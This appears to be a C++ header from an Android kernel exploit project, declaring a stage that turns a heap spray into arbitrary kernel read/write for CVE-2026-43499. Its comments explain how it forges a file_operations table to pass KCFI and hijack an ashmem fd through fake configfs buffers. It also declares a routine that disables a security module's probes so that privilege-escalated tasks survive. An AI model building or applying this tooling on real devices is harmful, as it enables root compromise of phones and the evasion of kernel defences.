#ifndef GHOSTLOCK_CFI_STAGE_HPP
#define GHOSTLOCK_CFI_STAGE_HPP

/*
 * CFI stage: turn one ghostlock page-spray write into a resident kernel
 * read/write channel.
 *
 * Ported from CVE-2026-43499-Neo11Plus `exploit/src/fops.c` (`try_cfi_stage`,
 * `repair_fake_fops_llseek`) and `exploit/src/util.c` (`put_fake_fops_table`,
 * `configfs_write_once` / `configfs_read_once`). Design and the per-field
 * contract live in the batch plan (L-level: attack path + shared primitive
 * behaviour + Kotlin contract).
 *
 * What it does, in one paragraph: `*(&ashmem_misc.fops)` is overwritten with
 * the address of a forged `struct file_operations` table that lives inside the
 * page the erase node already lives in. Every slot of that table holds a real
 * kernel function, so KCFI passes on the callee's own type hash — nothing is
 * forged or replayed. The ashmem fd opened *before* the hijack therefore keeps
 * using that table, and `ASHMEM_SET_NAME` reshapes its `private_data` into a
 * fake `struct configfs_buffer`, so `pread`/`pwrite` on that fd become
 * arbitrary kernel reads/writes through the real configfs bin iterators.
 *
 * Lifecycle contract (the reason this is a header and not just a .cpp):
 *   - the fd is opened before the hijack and closed only at process exit; the
 *     hijacked page must outlive it (see the usage rules below);
 *   - `&ashmem_misc.fops` is deliberately NOT restored here. The vr.ko stage
 *     (step 3) still needs the channel; the restore goes last, after it.
 *
 * Usage rules for any later stage that borrows `CfiKernelRw`:
 *   1. never call `attack_write` / `prepare_good_kernel_page` again — that
 *      replaces and frees `session.heap.current`, which the kernel still
 *      references through `file->f_op` (use-after-free);
 *   2. a successful `read` leaves `read_in_progress` set in the fake
 *      configfs buffer, so the next `pwrite` on the same fd must come after a
 *      `write` (which clears it); pair reads and writes;
 *   3. never `lseek` this fd expecting kernel traffic — only the address
 *      embedded by `write`/`read` decides where the copy goes.
 */

#include "memory/payload_builder.h"
#include "session/backend/cfi_layout.hpp"
#include "profile/model.h"
#include "session/exploit_session.hpp"
#include "support/status.hpp"

#include <cstddef>
#include <cstdint>
#include <span>

namespace ghostlock::session::backend {
    /* Resident kernel read/write through the hijacked ashmem fd. Holds no
     * ownership of the page: the kernel's `file->f_op` borrows it. */
    struct CfiKernelRw final {
        int32_t fd = -1;
        /* Threshold from which `write` is allowed to short-circuit. */
        uintptr_t fake_fops = 0;

        [[nodiscard]] bool valid() const noexcept {
            return fd >= 0;
        }

        /* Write `bytes.size()` bytes from userspace to `target` in the kernel
         * direct map. Replaces the write-in-progress state, so this also clears
         * a previous read's `read_in_progress`. */
        [[nodiscard]] Status write(uintptr_t target, const void *bytes,
                                   size_t size) const noexcept;

        /* Read `size` bytes of kernel memory at `target` into userspace. */
        [[nodiscard]] Status read(uintptr_t target, void *bytes,
                                  size_t size) const noexcept;

        [[nodiscard]] Status write64(uintptr_t target, uint64_t value) const noexcept;

        [[nodiscard]] bool read64(uintptr_t target, uint64_t &out) const noexcept;

        /* First resident write: install noop_llseek into the corrupted slot and
         * read it back. Doubles as the 8-byte kernel read/write self-check, so
         * it must not be skipped. */
        [[nodiscard]] bool repair_llseek(uintptr_t noop_llseek) const noexcept;
    };

    /* The resident channel established by the most recent successful run, or an
     * invalid handle. Single value because the stage runs once per process, in
     * one place, on the attack thread. */
    [[nodiscard]] CfiKernelRw cfi_kernel_rw() noexcept;

    /* What one vr.ko probe-neutralisation pass did, for the log and for the
     * caller. Kept separate from the return value so "nothing to do" (vr.ko not
     * loaded) is distinguishable from "could not do it". */
    struct VrNeutralizeReport final {
        /* Module-region probes found on the commit_creds tracepoint; -1 when the
         * tracepoint could not be resolved at all. */
        int32_t commit_creds_probes = -1;
        /* How many sys_exit probe slots were matched and redirected. */
        int32_t neutralized = 0;
        /* True when the fallback ("redirect every module-region probe on
         * sys_exit", used when the fixed code delta does not match) was taken. */
        bool used_fallback = false;
    };

    /* Globally redirect vr.ko's sys_exit tracepoint probe to the tracepoint's own
     * `probestub` no-op, so tasks that escalate after this point are no longer
     * killed by vr.ko on exit. Data-only writes into the tracepoint's funcs[]
     * array; no module memory and no page tables are touched. Idempotent and
     * safe when vr.ko is absent (it then finds no module-region probe and
     * reports 0).
     *
     * Must run after the CFI channel exists: it needs the resident read as well
     * as the write. This is step 3A of the integration plan; the per-task tag
     * clearing (3B) still happens on the attack path, before W2, because the tag
     * has to be gone before W2's getuid() probe. */
    [[nodiscard]] VrNeutralizeReport neutralize_vr_probes(const CfiKernelRw &channel,
                                                          const CfiSymbols &symbols) noexcept;

    /* Stage entry, called by the cve_2026_43499 backend after the W2/W3 chain
     * and before the frontend handoff. Reports its own step through
     * `support::run_state`; returns false without touching the kernel when the
     * profile lacks the CFI constants or the payload geometry it depends on. */
    template <class Middleware>
    [[nodiscard]] Status run_cfi_stage(ExploitSession &session);
} // namespace ghostlock::session::backend

#endif
